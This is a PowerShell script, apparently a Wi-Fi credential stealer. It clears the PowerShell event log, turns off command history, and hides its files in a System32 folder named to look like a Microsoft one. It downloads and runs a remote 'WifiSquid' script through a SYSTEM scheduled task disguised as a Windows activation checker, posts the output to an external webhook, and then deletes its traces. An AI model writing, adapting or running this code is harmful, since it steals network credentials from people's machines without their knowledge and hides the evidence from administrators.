#variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
$regPath = "HKLM:\Software\WindowsUpdateService"
$code = (Get-ItemProperty -Path $regPath).Code
$taskname = "Widows Activation Status Verifier"
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
$corescriptfile = Join-Path -Path $basepath -ChildPath "WifiSquidWrapper.ps1"
$finaloutput = Join-Path -Path $basepath -ChildPath "wifi-$code.txt"


##Script starting
if (-not (Test-Path -Path $basepath)) {
    New-Item -ItemType Directory -Path $basepath -Force | Out-Null
}

#creating the wrapper.
$corescriptcontent = @'
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$regPath = "HKLM:\Software\WindowsUpdateService"
$code = (Get-ItemProperty -Path $regPath).Code
$squidurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/WifiRelated/WifiSquid.ps1"
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
$finaloutput = Join-Path -Path $basepath -ChildPath "wifi-$code.txt"
Invoke-RestMethod -Uri $squidurl | Invoke-Expression | Out-file -FilePath $finaloutput
Add-Content -Path $finaloutput -Value "---"
'@
Remove-Item $corescriptfile -Force -ErrorAction SilentlyContinue
$corescriptcontent | Set-Content -Path $corescriptfile -Force

#scheduling and running a task.
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$corescriptfile`""
$triggerTime = (Get-Date)
if (Get-ScheduledTask -TaskName $taskname -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskname -Confirm:$false -ErrorAction SilentlyContinue
}
Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -Once -At $triggerTime) -TaskName $taskname -User "NT AUTHORITY\SYSTEM" | Out-Null
Start-ScheduledTask -TaskName $taskname
Start-Sleep 10

# Data upload
$boundary = [System.Guid]::NewGuid().ToString()
$fileBytes = [System.IO.File]::ReadAllBytes($finaloutput)
$fileName = [System.IO.Path]::GetFileName($finaloutput)
$LF = "`r`n"
$body = (
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
    "Content-Type: application/octet-stream$LF$LF" +
    [System.Text.Encoding]::Default.GetString($fileBytes) + $LF +
    "--$boundary--$LF"
)
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyBytes -UseBasicParsing | Out-Null

#clean up
Unregister-ScheduledTask -TaskName $taskname -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item -Path $finaloutput -Force -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item -Path $corescriptfile -Force -Confirm:$false -ErrorAction SilentlyContinue